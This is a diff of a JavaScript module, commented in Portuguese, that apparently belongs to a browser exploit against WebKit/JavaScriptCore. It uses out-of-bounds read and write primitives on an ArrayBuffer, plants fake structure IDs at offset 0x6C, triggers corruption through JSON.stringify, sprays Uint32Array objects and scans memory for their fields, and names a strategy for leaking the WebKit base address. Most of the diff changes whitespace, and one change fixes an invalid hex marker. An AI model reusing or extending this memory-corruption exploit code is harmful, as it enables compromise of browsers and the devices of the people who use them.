@@ -23,8 +23,8 @@ const OOB_AB_SNOOP_WINDOW_SIZE = 0x100;
 
 const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
     0xFEFEFEFE, 0xCDCDCDCD, 0x12345678, 0x00000000, 0xABABABAB,
-    (JSC_OFFSETS.ArrayBuffer && JSC_OFFSETS.ArrayBuffer.KnownStructureIDs && JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) 
-        ? JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID 
+    (JSC_OFFSETS.ArrayBuffer && JSC_OFFSETS.ArrayBuffer.KnownStructureIDs && JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID)
+        ? JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID
         : 2 // Fallback se não definido
 ];
 
@@ -104,10 +104,10 @@ export async function executeRetypeOOB_AB_Test() {
     logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C (Corrigido) ---`, "test", FNAME_TEST_RUNNER);
     let overall_summary = [];
 
-    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || 
-        !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs || 
+    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell ||
+        !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs ||
         typeof JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === 'undefined') {
-        logS3("Offsets Críticos Ausentes para Teste 0x6C (ex: JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID)", "critical", FNAME_TEST_RUNNER); 
+        logS3("Offsets Críticos Ausentes para Teste 0x6C (ex: JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID)", "critical", FNAME_TEST_RUNNER);
         return;
     }
 
@@ -121,7 +121,7 @@ export async function executeRetypeOOB_AB_Test() {
         try {
             await triggerOOB_primitive();
             if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) { throw new Error("OOB Init ou primitivas R/W falharam para Teste 0x6C"); }
-            
+
             const fill_limit = Math.min(OOB_AB_SNOOP_WINDOW_SIZE, oob_array_buffer_real.byteLength);
             for (let offset = 0; offset < fill_limit; offset += 4) {
                 if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) || (offset >= TARGET_WRITE_OFFSET_0x6C && offset < TARGET_WRITE_OFFSET_0x6C + 8)) continue;
@@ -131,11 +131,11 @@ export async function executeRetypeOOB_AB_Test() {
             if (TARGET_WRITE_OFFSET_0x6C + 4 < oob_array_buffer_real.byteLength && !(TARGET_WRITE_OFFSET_0x6C + 4 >= CORRUPTION_OFFSET_TRIGGER && TARGET_WRITE_OFFSET_0x6C + 4 < CORRUPTION_OFFSET_TRIGGER + 8)) {
                 oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x00000000, 4);
             }
-            
+
             global_object_for_internal_stringify = { "unique_id": 0xC0FFEE00 + initial_low_dword_planted, "data_payload": "GetterStressData"};
             oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-            
-            const checkpoint_obj = new CheckpointFor0x6CAnalysis(1); 
+
+            const checkpoint_obj = new CheckpointFor0x6CAnalysis(1);
             checkpoint_obj.prop_for_stringify_target = global_object_for_internal_stringify;
             JSON.stringify(checkpoint_obj);
 
@@ -152,8 +152,8 @@ export async function executeRetypeOOB_AB_Test() {
             if (!current_test_results_for_subtest.success || current_test_results_for_subtest.error || !current_test_results_for_subtest.getter_actually_called) { // Log mais detalhado em caso de problema
                  logS3(`FIM DO SUB-TESTE 0x6C (padrão ${toHex(initial_low_dword_planted)}): Success=${current_test_results_for_subtest.success}, GetterCalled=${current_test_results_for_subtest.getter_actually_called}, Msg=${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "good" : "warn", FNAME_TEST_RUNNER);
             }
-            overall_summary.push(JSON.parse(JSON.stringify(current_test_results_for_subtest))); 
-            clearOOBEnvironment(); 
+            overall_summary.push(JSON.parse(JSON.stringify(current_test_results_for_subtest)));
+            clearOOBEnvironment();
             global_object_for_internal_stringify = null;
             if (initial_low_dword_planted !== LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C[LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C.length - 1]) {
                  await PAUSE_S3(50);
@@ -186,9 +186,9 @@ export async function sprayAndInvestigateObjectExposure() {
     const SCAN_WINDOW_HALF_SIZE = 0x28; // Aumentado um pouco para garantir que todos os campos de ABView sejam cobertos
     const SCAN_STEP = 0x8; // JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET assume-se 0x8, mas usar valor direto é mais seguro
 
-    logS3(`   AVISO: Usando StructureID esperado para Uint32Array: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID_USER_DEFINED)}. SUBSTITUA PELO VALOR CORRETO!`, "warn", FNAME_SPRAY_INVESTIGATE);
+    logS3(`     AVISO: Usando StructureID esperado para Uint32Array: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID_USER_DEFINED)}. SUBSTITUA PELO VALOR CORRETO!`, "warn", FNAME_SPRAY_INVESTIGATE);
     if (EXPECTED_UINT32ARRAY_STRUCTURE_ID_USER_DEFINED === 0xABCDE00F) { // Verifica se ainda é o placeholder
-         logS3(`   O StructureID de Uint32Array (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID_USER_DEFINED)}) acima é um PLACEHOLDER. A fase de pré-scan pode não ser útil.`, "critical", FNAME_SPRAY_INVESTIGATE);
+         logS3(`     O StructureID de Uint32Array (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID_USER_DEFINED)}) acima é um PLACEHOLDER. A fase de pré-scan pode não ser útil.`, "critical", FNAME_SPRAY_INVESTIGATE);
     }
 
     let sprayedVictimObjects = [];
@@ -204,7 +204,7 @@ export async function sprayAndInvestigateObjectExposure() {
         logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE); // Linha ~203
         for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) { // Linha ~204 (Linha 213 se contar do topo do módulo na versão anterior)
             let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
-            arr[0] = (0xSPRAYF00D | i); // Marcador
+            arr[0] = (0xBADF00D0 | i); // Marcador CORRIGIDO
             sprayedVictimObjects.push(arr);
         } // Fim do loop
         logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
@@ -225,7 +225,7 @@ export async function sprayAndInvestigateObjectExposure() {
                     const vec_before = oob_read_absolute(offset + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8);
                     const len_before = oob_read_absolute(offset + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 4);
                     preCorruptionCandidates[offset.toString()] = { sid_before: sid, vec_before: (isAdvancedInt64Object(vec_before) ? vec_before.toString(true) : toHex(vec_before)), len_before: len_before };
-                    logS3(`    Antes da corrupção: m_vector=${isAdvancedInt64Object(vec_before) ? vec_before.toString(true) : toHex(vec_before)}, m_length=${toHex(len_before)} (${len_before})`, "info", FNAME_SPRAY_INVESTIGATE);
+                    logS3(`     Antes da corrupção: m_vector=${isAdvancedInt64Object(vec_before) ? vec_before.toString(true) : toHex(vec_before)}, m_length=${toHex(len_before)} (${len_before})`, "info", FNAME_SPRAY_INVESTIGATE);
                 } else if (sid !== OOB_SCAN_FILL_PATTERN && sid !== 0 && sid !== 0xFFFFFFFF && (sid & 0xFFFF0000) !== (OOB_SCAN_FILL_PATTERN & 0xFFFF0000)) {
                     logS3(`  Encontrado StructureID ${toHex(sid)} em ${toHex(offset)} (não é o esperado Uint32Array nem padrão de preenchimento).`, "info", FNAME_SPRAY_INVESTIGATE);
                 }
@@ -317,5 +317,5 @@ export async function sprayAndInvestigateObjectExposure() {
 export async function attemptWebKitBaseLeakStrategy_OLD() {
     const FNAME_LEAK_RUNNER = "attemptWebKitBaseLeakStrategy_v3_OLD";
     logS3(`--- Iniciando Estratégia de Vazamento de Base do WebKit (v3 - via JSWithScope - ARQUIVADA) ---`, "test", FNAME_LEAK_RUNNER);
-    logS3("   (Função attemptWebKitBaseLeakStrategy_OLD não executada ativamente neste fluxo)", "info", FNAME_LEAK_RUNNER);
+    logS3("     (Função attemptWebKitBaseLeakStrategy_OLD não executada ativamente neste fluxo)", "info", FNAME_LEAK_RUNNER);
 }
